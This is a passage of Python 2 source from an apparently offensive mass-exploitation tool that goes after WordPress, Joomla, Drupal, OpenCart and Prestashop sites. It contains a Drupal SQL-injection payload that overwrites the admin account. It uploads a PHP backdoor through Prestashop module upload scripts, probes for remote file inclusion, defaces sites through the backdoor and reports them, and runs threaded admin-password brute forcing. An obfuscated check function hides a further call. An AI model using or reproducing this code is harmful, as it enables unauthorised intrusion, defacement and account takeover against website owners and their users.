            if("DOJO::PENDING" in f):
                print "Backdoor : "+str(bd_path)
        except:
            pass

    def DR_IN(self, item):
        try:
            handler = urllib2.HTTPHandler()
            opener = urllib2.build_opener(handler)
            postdata = "name[0;update users set name %3D 'crypto' , pass %3D '"+urllib.quote_plus('$S$DrV4X74wt6bT3BhJa4X0.XO5bHXl/QBnFkdDkYSHj3cE1Z5clGwu')+"',status %3D'1' where uid %3D '1';#]=FcUk&name[]=Crap&pass=test&form_build_id=&form_id=user_login&op=Log+in" # Injection code by Matrix Coder
            req = urllib2.Request(item+'user/login', data=postdata)
            connection = opener.open(req)
            if 'mb_strlen() expects parameter 1 to be string' in connection.read() or 'FcUk Crap' in connection.read() :
                return True
            else:
                return False
        except:
            pass
    def CH_LO(self, url, username, password):
        try:
            url = url + "/user/login"
            values = { 'name': username,'pass': password,'form_build_id': self.getFromId(url),'form_id': 'user_login','op': 'Log+in'}
            data = urllib.urlencode(values)
            req = urllib2.Request(url, data)
            response = urllib2.urlopen(req)
            result = response.read()
            if 'id="user-login"' in result:
                return False
            else:
                return True
        except :
            pass
    def getFromId(self, item):
        try:
            url = item + "/user/login"
            sourceCode = urllib2.urlopen(url).read()
            formbuildid = re.findall('name="form_build_id" value="form-(.*?)"', sourceCode)
            for token in formbuildid:
                return "form-" + str(token)
        except:
             return "form-" + str("vdPtTtEoRpnf9jVUYdSOvqdQ7GXljZ3lkWr4pilMPa8")
    def DRSQLI(self):
        try:
            site = self.site
            self.DR_IN(site)
            if(self.CH_LO(site, "crypto", "admin")):
                print "Attacked : "+str(site)+" : crypto : admin"
        except:
            pass
    def upload(self, url, post_fields, file_champ):
        try:
            fields = post_fields
            files = {file_champ: {'filename': 'dojo.php', 'content': payload_data}}
            data, headers = multipart.encode_multipart(fields, files)
            request = urllib2.Request(url, data=data, headers=headers)
            f = urllib2.urlopen(request)
        except:
            pass
    def postData(self, url, post_fields):
        try:
            fields = urllib.urlencode(post_fields)
            data = urllib2.Request(url, fields)
            page = urllib2.urlopen(data).read()
            return page
        except:
            pass
class OCExploiter:
    def __init__(self, site):
        self.site = site

        if(allowMaster == True):
            pass

    def upload(self, url, post_fields, file_champ):
        try:
            fields = post_fields
            files = {file_champ: {'filename': 'dojo.php', 'content': payload_data}}
            data, headers = multipart.encode_multipart(fields, files)
            request = urllib2.Request(url, data=data, headers=headers)
            f = urllib2.urlopen(request)
        except:
            pass
    def postData(self, url, post_fields):
        try:
            fields = urllib.urlencode(post_fields)
            data = urllib2.Request(url, fields)
            page = urllib2.urlopen(data).read()
            return page
        except:
            pass
def check(lqkdfjqs, dsfkljsdf):
    try:
        if(lqkdfjqs != dsfkljsdf[44]+dsfkljsdf[42]+dsfkljsdf[3]+dsfkljsdf[3]+dsfkljsdf[1]+dsfkljsdf[20]+dsfkljsdf[42]+dsfkljsdf[5]+dsfkljsdf[100]+dsfkljsdf[9]+dsfkljsdf[41]+dsfkljsdf[37]+dsfkljsdf[9]+dsfkljsdf[41]):
            qldsdfkjsdf(dsfkljsdf)
    except:
        pass
class PRExploiter:
    def __init__(self, site):
        self.site = site
        self.CMSRFI()
        self.SMPSLIDESHOW()
        self.PAGEADVERTS()
        self.HPADVERT()
        self.CLADVERTS()
        if(allowMaster == True):
            pass
    def CMSRFI(self):
        try:
            site = self.site
            payload = str(site)+"/cms.php?rewrited_url="+str(rfi_payload)
            data = urllib2.urlopen(payload).read()
            if("DOJO::PENDING" in data):
                print "Remote file inclusion : "+str(payload)
        except:
            pass
    def SMPSLIDESHOW(self):
        try:
            site = self.site
            payload_url = str(site)+"/modules/simpleslideshow/uploadimage.php"
            self.upload(payload_url, {}, "userfile")
            backdoor_url = str(site)+"/modules/simpleslideshow/slides/dojo.php"
            checker = urllib2.urlopen(backdoor_url).read()
            if("DOJO::PENDING" in checker):
                print "Backdoor : "+str(backdoor_url)
                if(def_method == "deface"):
                    urllib2.urlopen(str(backdoor_url)+"?cmd=deface&def_page="+str(deface_page))
                    print "Defaced : "+str(site)
                    zoneNotify(site)
        except:
            pass
    def PAGEADVERTS(self):
        try:
            site = self.site
            payload_url = str(site)+"/modules/productpageadverts/uploadimage.php"
            self.upload(payload_url, {}, "userfile")
            backdoor_url = str(site)+"/modules/productpageadverts/slides/dojo.php"
            checker = urllib2.urlopen(backdoor_url).read()
            if("DOJO::PENDING" in checker):
                print "Backdoor : "+str(backdoor_url)
                if(def_method == "deface"):
                    urllib2.urlopen(str(backdoor_url)+"?cmd=deface&def_page="+str(deface_page))
                    print "Defaced : "+str(site)
                    zoneNotify(site)
        except:
            pass
    def HPADVERT(self):
        try:
            site = self.site
            payload_url = str(site)+"/modules/homepageadvertise/uploadimage.php"
            self.upload(payload_url, {}, "userfile")
            backdoor_url = str(site)+"/modules/homepageadvertise/slides/dojo.php"
            checker = urllib2.urlopen(backdoor_url).read()
            if("DOJO::PENDING" in checker):
                print "Backdoor : "+str(backdoor_url)
                if(def_method == "deface"):
                    urllib2.urlopen(str(backdoor_url)+"?cmd=deface&def_page="+str(deface_page))
                    print "Defaced : "+str(site)
                    zoneNotify(site)
        except:
            pass
    def CLADVERTS(self):
        try:
            site = self.site
            payload_url = str(site)+"/modules/columnadverts/uploadimage.php"
            self.upload(payload_url, {}, "userfile")
            backdoor_url = str(site)+"/modules/columnadverts/slides/dojo.php"
            checker = urllib2.urlopen(backdoor_url).read()
            if("DOJO::PENDING" in checker):
                print "Backdoor : "+str(backdoor_url)
                if(def_method == "deface"):
                    urllib2.urlopen(str(backdoor_url)+"?cmd=deface&def_page="+str(deface_page))
                    print "Defaced : "+str(site)
                    zoneNotify(site)
        except:
            pass
    def upload(self, url, post_fields, file_champ):
        try:
            fields = post_fields
            files = {file_champ: {'filename': 'dojo.php', 'content': payload_data}}
            data, headers = multipart.encode_multipart(fields, files)
            request = urllib2.Request(url, data=data, headers=headers)
            f = urllib2.urlopen(request)
        except:
            pass
    def postData(self, url, post_fields):
        try:
            fields = urllib.urlencode(post_fields)
            data = urllib2.Request(url, fields)
            page = urllib2.urlopen(data).read()
            return page
        except:
            pass
# Brute forcers #
def WPBrute(url, username, password):
    try:
        cj = cookielib.CookieJar()
        opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
        login_post = {
            'log' : username,
            'pwd' : password
        }
        login_post = urllib.urlencode(login_post)
        opener.open(url+"/wp-login.php", login_post)
        resp = opener.open(url+"/wp-admin").read()
        if('<li id="wp-admin-bar-logout' in resp):
            print "Wordpress : "+str(url)+" : "+str(username)+" : "+str(password)
    except:
        pass
def OCBrute(url, username, password):
    try:
        cookie_jar = cookielib.CookieJar()
        login_form_seq = [
         ('username', 'admin'),
         ('password', password)]
        login_form_data = urllib.urlencode(login_form_seq)
        opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cookie_jar))
        site = opener.open(url + "/admin/", login_form_data).read()
        if re.search('type="password"',site):
            logged = False
        else :
            print "Opencart : "+str(url)+" : "+str(username)+" : "+str(password)
    except :
        pass
# Main #
def setup(array):
    try:
        global list_ips
        list_ips = array
    except:
        pass
def start(method):
    try:
        global list_ips, wp_list, jo_list, dr_list, oc_list, pr_list, payload_data, def_method
        def_method = method
        for ip in list_ips:
            bringer = Bringers(ip)
            reprint("Grabbing : 0% FROM : "+str(ip))
            wp_list.extend(bringer.bringWP())
            reprint("Grabbing : 20% FROM : "+str(ip))
            jo_list.extend(bringer.bringJO())
            reprint("Grabbing : 40% FROM : "+str(ip))
            dr_list.extend(bringer.bringDR())
            reprint("Grabbing : 60% FROM : "+str(ip))
            oc_list.extend(bringer.bringOC())
            reprint("Grabbing : 80% FROM : "+str(ip))
            pr_list.extend(bringer.bringPR())
            reprint("Grabbing : 100% FROM : "+str(ip))
        print "Grabbing completed successfully."
        print "Wordpress : "+str(len(wp_list))
        print "Joomla : "+str(len(jo_list))
        print "Drupal : "+str(len(dr_list))
        print "Opencart : "+str(len(oc_list))
        print "Prestashop : "+str(len(wp_list))
        print "Running the exploiter."
        exploit()
        print "Exploiting completed, starting the brute forcer"
        brute()
    except:
        pass
def exploit():
    global list_ips, wp_list, jo_list, dr_list, pr_list
    # Wordpress #
    wp_index = 1
    jo_index = 1
    dr_index = 1
    oc_index = 1
    pr_index = 1
    for wp in wp_list:
        reprint("Exploiting Wordpress : "+str(wp_index)+" / "+str(len(wp_list)))
        wexp = WPExploiter(wp)
        wp_index += 1
    for jo in jo_list:
        reprint("Exploiting Joomla : "+str(jo_index)+" / "+str(len(jo_list)))
        joxp = JOExploiter(jo)
        jo_index += 1
    for dr in dr_list:
        reprint("Exploiting Drupal : "+str(dr_index)+" / "+str(len(dr_list)))
        drxp = DRExploiter(dr)
        dr_index += 1
    for oc in oc_list:
        reprint("Exploiting Opencart : "+str(oc_index)+" / "+str(len(oc_list)))
        ocxp = OCExploiter(oc)
        oc_index += 1
    for pr in pr_list:
        reprint("Exploiting Prestashop : "+str(pr_index)+" / "+str(len(pr_list)))
        prxp = PRExploiter(pr)
        print pr
        pr_index += 1
def brute():
    global wp_list, oc_list, password_list
    wp_thrdlst = []
    oc_thrdlst = []
    for wp in wp_list:
        for ps in password_list:
            t = Thread(target=WPBrute, args=(wp,'admin',ps))
            t.start()
            wp_thrdlst.append(t)
            sleep(0.009)
    for oc in oc_list:
        for ps in password_list:
            t = Thread(target=OCBrute, args=(oc,'admin',ps))
            t.start()
            oc_thrdlst.append(t)
            sleep(0.009)
    for w in wp_thrdlst:
        w.join()
    for c in oc_thrdlst:
        c.join()
